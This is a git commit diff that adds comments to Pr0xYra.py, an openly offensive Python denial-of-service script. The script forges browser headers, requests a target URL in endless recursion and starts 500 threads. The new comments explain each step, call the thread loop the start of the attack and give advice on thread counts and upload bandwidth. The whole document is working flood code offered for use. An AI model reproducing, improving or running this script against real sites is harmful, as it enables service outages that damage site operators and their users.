d68b9292aea558913f7d63fb87ffeac363e00a3f
Void Code <32872194+voidcode1337@users.noreply.github.com>
2018-02-17 23:31:29 +0100

    Update Pr0xYra.py
    Added comments

--- Pr0xYra.py
+++ Pr0xYra.py
@@ -1,7 +1,7 @@
-import urllib.request
-import random
-import threading
-import sys
+import urllib.request # Sending requests
+import random         # For generating random keep-alive time
+import threading      # For multi threading
+import sys            # sys.argv
 
 
 print("============================")
@@ -30,19 +30,20 @@ else:
     usage()
 
 
-def ddos(req, counter=0):
+def ddos(req, counter=0):  # send request to site
     try:
         urllib.request.urlopen(request)
     except Exception as err:
-        print('Error', err)
+        print('Error', err)  # if its unable to send req, print err code
     finally:
-        ddos(req, counter+1)
+        ddos(req, counter+1) # recursion, call it again and again and again
 
 
 
-user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
-referer = "http://www.google.ba/search?q=Pr0xYra"
+user_agent = "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0" # You can set any user_agent you want
+referer = "http://www.google.ba/search?q=Pr0xYra" # You can set any referal you want
 
+# Forge request to be sent to target url
 
 request = urllib.request.Request(url)
 request.add_header('User-Agent', user_agent)
@@ -53,15 +54,18 @@ request.add_header("Keep-Alive", random.randint(100, 150))
 request.add_header("Host", host)
 
 
-def run():
+def run(): # function to handle every thread and call ddos function
     while True:
         try:
             ddos(request)
         except Exception as err:
             print("---> KARANJE HAS BEGUN <---")
 
-
-for i in range(500):
+# create all threads and start attack
+# you can changr number below for more or less if you want
+# for me this is enough
+# minimal upload speed should be 1MB/s(8Mb/s) for normal functioning
+for i in range(500): 
     t = threading.Thread(target=run)
     t.start()
 
